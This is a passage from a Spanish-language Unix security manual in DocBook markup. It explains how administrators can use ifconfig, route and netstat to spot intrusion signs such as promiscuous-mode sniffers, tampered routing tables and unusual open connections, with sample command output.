     la identidad de otro equipo no s&#x00F3;lo a nivel de IP, sino a nivel de direcci&#x00F3;n MAC. Cuando esto
     sucede, casi con toda seguridad se acompa~na de un IP Spoof para conseguir una suplantaci&#x00F3;n
     que no sea tan f&#x00E1;cil de detectar como el IP Spoof a secas.
     </para></listitem>
     <listitem>
     <!--l. 426--><para>Tarjeta en modo promiscuo.
     <!--br/-->Alguien ha instalado un sni&#xFB00;er en nuestro sistema y ha puesto la tarjeta de red en modo
     promiscuo, para capturar todas las tramas que &#x00E9;sta &#x2018;ve&#x2019;. Es un m&#x00E9;todo muy utilizado por
     atacantes que han conseguido privilegio de superusuario en la m&#x00E1;quina (es necesario ser root
     para situar a la tarjeta en este modo de operaci&#x00F3;n) y se est&#x00E1; dedicando a analizar el tr&#x00E1;&#xFB01;co de la
     red en busca de logins y claves de usuarios de otros equipos.</para></listitem></itemizedlist>
<!--l. 435--><para>
  </para></section><!--end subsection--><!--l. 435--><section 
role="subsection"><title><abbrev role="title-mark">13.3.2</abbrev><anchor 
   id="x1-19900013.3.2"  ></anchor>La orden route</title>
<!--l. 436--><para>  Este comando se utiliza para con&#xFB01;gurar las tablas de rutado del n&#x00FA;cleo de nuestro sistema. Generalmente
en todo equipo de una red local tenemos al menos tres rutas: la de loopback, utilizando el
dispositivo de bucle interno (lo, lo0&#x2026;), la de red local (localnet), que utiliza la tarjeta de red para
comunicarse con equipos dentro del mismo segmento de red, y una default que tambi&#x00E9;n utiliza
la tarjeta para enviar a un router o gateway paquetes que no son para equipos de nuestro
segmento. Si no se especi&#xFB01;ca ning&#x00FA;n par&#x00E1;metro, route muestra la con&#xFB01;guraci&#x00F3;n actual de las tablas de
rutado <anchor 
   id="x1-199001f3"  ></anchor><footnote><para>     En algunos Unix, esto se consigue con la orden netstat -r.</para></footnote>:

     </para><literallayout role="verbatim">
&#x00A0;andercheran:~#&#x00A0;route
&#x00A0;Kernel&#x00A0;routing&#x00A0;table
&#x00A0;Destination&#x00A0;&#x00A0;&#x00A0;Gateway&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Genmask&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Flags&#x00A0;&#x00A0;MSS&#x00A0;&#x00A0;&#x00A0;&#x00A0;Window&#x00A0;&#x00A0;Use&#x00A0;Iface
&#x00A0;localnet&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;255.255.0.0&#x00A0;&#x00A0;&#x00A0;&#x00A0;U&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;1500&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;16&#x00A0;&#x00A0;eth0
&#x00A0;loopback&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;255.0.0.0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;U&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;3584&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;89&#x00A0;&#x00A0;lo
&#x00A0;default&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;atlas.cc.upv.es&#x00A0;&#x00A0;*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;UG&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;1500&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;66&#x00A0;&#x00A0;eth0
&#x00A0;andercheran:~#
</literallayout>
<!--l. 459--><para>Si route nos muestra una con&#xFB01;guraci&#x00F3;n sospechosa (esto es, las tablas no son las que en el sistema hemos
establecido como administradores, aunque todo funcione correctamente) esto puede denotar un ataque de
simulaci&#x00F3;n: alguien ha desviado el tr&#x00E1;&#xFB01;co por un equipo que se comporta de la misma forma que se
comportar&#x02CA;&#x0131;a el original, pero que seguramente analiza toda la informaci&#x00F3;n que pasa por &#x00E9;l. Hemos de
recalcar que esto suele ser transparente al buen funcionamiento del equipo (no notamos ni
p&#x00E9;rdida de paquetes, ni retardos excesivos, ni nada sospechoso), y que adem&#x00E1;s el atacante puede
modi&#xFB01;car los &#xFB01;cheros de arranque del sistema para, en caso de reinicio de la m&#x00E1;quina, volver a
tener con&#xFB01;guradas las rutas a su gusto; estos &#xFB01;cheros suelen del tipo /etc/rc.d/rc.inet1 o
/etc/rc?.d/S<informalequation><graphic 
fileref="unixsec281x.gif"></graphic></informalequation>inet.
<!--br/-->
<!--br/-->Tambi&#x00E9;n es posible que alguien est&#x00E9; utilizando alg&#x00FA;n elemento utilizado en la conexi&#x00F3;n entre nuestro sistema y
otro (un router, una pasarela&#x2026;) para amenazar la integridad de nuestro equipo; si queremos comprobar el
camino que siguen los paquetes desde que salen de la m&#x00E1;quina hasta que llegan al destino, podemos utilizar
la orden traceroute. Sin embargo, este tipo de ataques es mucho m&#x00E1;s dif&#x02CA;&#x0131;cil de detectar, y casi la &#x00FA;nica
herramienta asequible para evitarlos es la criptograf&#x02CA;&#x0131;a.
  </para></section><!--end subsection--><!--l. 479--><section 
role="subsection"><title><abbrev role="title-mark">13.3.3</abbrev><anchor 
   id="x1-20000013.3.3"  ></anchor>La orden netstat</title>
<!--l. 480--><para>  Esta orden se utiliza para visualizar el estado de diversas estructuras de datos del sistema de red, desde
las tablas de rutado hasta el estado de todas las conexiones a y desde nuestra m&#x00E1;quina, pasando por las
tablas ARP, en funci&#x00F3;n de los par&#x00E1;metros que reciba.
<!--br/-->
<!--br/-->En temas referentes a la seguridad, netstat se suele utilizar, aparte de para mostrar las tablas
de rutado de ciertos sistemas (con la opci&#x00F3;n -r, como hemos visto antes), para mostrar los
puertos abiertos que escuchan peticiones de red y para visualizar conexiones a nuestro equipo (o
desde &#x00E9;l) que puedan salirse de lo habitual. Veamos un ejemplo de informaci&#x00F3;n mostrada por
netstat:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;netstat&#x00A0;-P&#x00A0;tcp&#x00A0;-f&#x00A0;inet&#x00A0;-a
&#x00A0;TCP
&#x00A0;&#x00A0;&#x00A0;&#x00A0;Local&#x00A0;Address&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;Remote&#x00A0;Address&#x00A0;&#x00A0;&#x00A0;&#x00A0;Swind&#x00A0;Send-Q&#x00A0;Rwind&#x00A0;Recv-Q&#x00A0;&#x00A0;State
&#x00A0;--------------------&#x00A0;--------------------&#x00A0;-----&#x00A0;------&#x00A0;-----&#x00A0;------&#x00A0;-------
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;IDLE
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.sunrpc&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;IDLE
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.32771&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.ftp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.telnet&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.finger&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.dtspc&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.lockd&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.smtp&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.8888&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.32772&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.32773&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.printer&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.listen&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.32774&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;IDLE
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.6000&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.32775&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;localhost.32777&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;localhost.32775&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;ESTABLISHED
&#x00A0;localhost.32775&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;localhost.32777&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;ESTABLISHED
&#x00A0;localhost.32780&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;localhost.32779&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;ESTABLISHED
&#x00A0;localhost.32779&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;localhost.32780&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;ESTABLISHED
&#x00A0;localhost.32783&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;localhost.32775&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;ESTABLISHED
&#x00A0;localhost.32775&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;localhost.32783&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;ESTABLISHED
&#x00A0;localhost.32786&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;localhost.32785&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;ESTABLISHED
&#x00A0;localhost.32785&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;localhost.32786&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;ESTABLISHED
&#x00A0;localhost.32789&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;localhost.32775&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;ESTABLISHED
&#x00A0;localhost.32775&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;localhost.32789&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;ESTABLISHED
&#x00A0;localhost.32792&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;localhost.32791&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;ESTABLISHED
&#x00A0;localhost.32791&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;localhost.32792&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;ESTABLISHED
&#x00A0;localhost.32810&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;localhost.6000&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;ESTABLISHED
&#x00A0;localhost.6000&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;localhost.32810&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;32768&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;ESTABLISHED
&#x00A0;anita.telnet&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;luisa.2039&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;16060&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;10136&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;ESTABLISHED
&#x00A0;anita.telnet&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;bgates.microsoft.com.1068&#x00A0;15928&#x00A0;0&#x00A0;10136&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;ESTABLISHED
